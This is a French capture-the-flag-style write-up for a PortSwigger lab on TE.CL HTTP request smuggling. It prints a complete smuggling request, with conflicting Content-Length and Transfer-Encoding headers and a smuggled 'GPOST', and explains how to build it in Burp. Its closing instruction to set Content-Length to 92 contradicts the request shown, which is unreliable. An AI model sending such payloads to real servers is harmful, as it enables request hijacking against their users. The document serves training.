# Lab

https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

## Solution

On sait que c'est un request smuggling de type TE.CL.

Donc on fait notre requête en HTTP 1.1 avec les header `Transfer-Encoding` et `Content-Length`.

- `Transfer-Encoding: chunked` pour indiquer que le body est en chunk
- `Content-Length: 4` pour indiquer la taille du body

```http
POST / HTTP/1.1
Host: 0a0300ee04aea01583eb7318008b00b0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-length: 15

x=1
0


```

Le contenu du premier post est `5c` pour indiquer que le prochain chunk fait 92 octets (0x5c = 92).

Un façon simple de générer cette requête est d'écrire le deuxième POST : 

```http
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-length: 15

x=1
```

De le sélectionner et de faire `clic droit > Extensions > HTTP Request Smuggler > Concert to chunked`.

L'extension va automatiquement ajouter la taille du chunck (5c) et le dernier chunk (0).

Ainsi, il n'y a plus qu'à modifier le `Content-Length` du premier POST pour qu'il soit égal à la taille du contenu du deuxième POST (92).